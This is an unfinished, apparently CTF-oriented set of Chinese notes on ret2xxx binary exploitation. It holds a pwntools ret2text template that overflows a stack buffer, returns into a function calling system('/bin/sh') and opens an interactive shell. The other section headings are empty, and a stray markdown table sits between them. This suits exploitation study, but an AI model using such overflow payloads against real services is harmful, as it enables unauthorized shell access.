- [ret2xxx系列](#ret2xxx系列)
  - [ret2text](#ret2text)
  - [ret2shellcode](#ret2shellcode)
  - [ret2libc](#ret2libc)
  - [ret2syscall](#ret2syscall)

 # ret2xxx系列
 ## ret2text

  1.有 `system("/bin/sh");` 时

```python
from pwn import *

io = process('./pwn1')              # 本地测试
# io = remote('', )                 # ('ip' , 端口)

getshell_code = 0x12345678          # 包含system("/bin/sh");的函数的地址

padding = 0xF + 4                   # 偏移量, 32位程序
payload = b'a' * padding + p32(getshell_code)

# padding = 0xF + 8                 # 偏移量, 64位程序
# payload = b'a' * padding + p64(getshell_code)

io.sendline(payload) 

io.interactive()

```


 | Syntax      | Description |
| ----------- | ----------- |
| Header      | Title       |
| Paragraph   | Text        |
 ## ret2shellcode

 ## ret2libc
 
 ## ret2syscall